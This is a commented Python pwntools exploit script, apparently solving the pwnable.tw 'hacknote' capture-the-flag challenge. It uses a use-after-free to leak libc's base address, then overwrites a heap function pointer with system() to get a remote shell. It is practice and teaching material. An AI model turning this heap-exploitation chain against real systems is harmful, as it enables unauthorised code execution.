#!/usr/bin/env python3

# Challenge labels: UAF, Leaking libc base addr

from pwn import *

import os
os.chdir("./patched")

exe = ELF("./hacknote_patched")
libc = ELF("./libc.so.6")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("chall.pwnable.tw", 10102)

    return r

def alloc_note(size: int, content: bytes, r):
    r.sendlineafter(b'choice :', b'1')
    r.sendlineafter(b'size :', str(size).encode())
    r.sendafter(b'Content :', content)

def free_note(index: int, r):
    r.sendlineafter(b'choice :', b'2')
    r.sendlineafter(b'Index :', str(index).encode())
    
def print_note(index: int, r):
    r.sendlineafter(b'choice :', b'3')
    r.sendlineafter(b'Index :', str(index).encode())

def main():
    r = conn()

    # For each note, the program actually allocates 2 chunks. 
    # The first is the chunk containing the metadata of the note, as well as a printNote function. It looks like
    # struct note {
    #     void* printNote; // Function to puts(arg1+4) 
    #     char* noteContent;
    # };
    # The second allocation is for noteContent, of which we both control the size and contents of the alloc. 
    # Using the UAF bug (because pointers are not zeroed after being freed), we will first leak the libc base addr, 
    # before overwriting printNote() to be libc system() and noteContent to be ";sh;"

    # Allocate the note0.noteContent chunk of size 72 (including metadata) with arb data, so that when freed it goes in the unsorted bin
    # We will use this to leak the libc base address in a bit
    alloc_note(68, b'A'*68, r) # Note 0

    # Allocate the note1.noteContent chunk of size 24 (including metadata) with arb data
    # We will overwrite printNote() with system(), so that when printing the note it will execute system(&note1)
    alloc_note(16, b'A'*24, r) # Note 1

    # First, free note 0 so that its fd and bk will be pointers to libc (since it's in the unsorted bin), 
    # then re-alloc the chunk such that only fd is corrupted. This allows us to leak bk and thus the libc
    # base addr due to fixed offset
    # NOTE: An easier method would just be to use the UAF to override the noteContent ptr with exe.got.puts (or some other GOT entry that points into libc)
    # and then printNote()
    free_note(index=0, r=r)
    alloc_note(68, b'A\n', r) # Note 2
    print_note(index=0, r=r)
    libc.address = u32(r.recvuntil(b'AAAA', drop=True)[4:8]) - 0x1b07b0
    log.info(f"{hex(libc.address)=}")

    # Setup fastbin for the UAF to overwrite note1.printNote and note1.noteContent
    free_note(index=1, r=r) # fastbin (size 0x10): note1
    free_note(index=2, r=r) # fastbin (size 0x10): note0/note2 -> note1 (notice that both note0/note2.noteContent and note1.noteContent do not go into that fastbin due to their size)

    # Exploit the UAF to overwrite note1.printNote and note1.noteContent
    alloc_note(8, p32(libc.sym.system) + b';sh\x00', r) # Note 3

    # Call note1.printNote, which has been overwritten with system()
    # This will run system("blah;sh") where "blah" is address of system(), effectively running system("sh") since the first cmd will fail
    print_note(index=1, r=r)
    
    r.interactive()


if __name__ == "__main__":
    main()
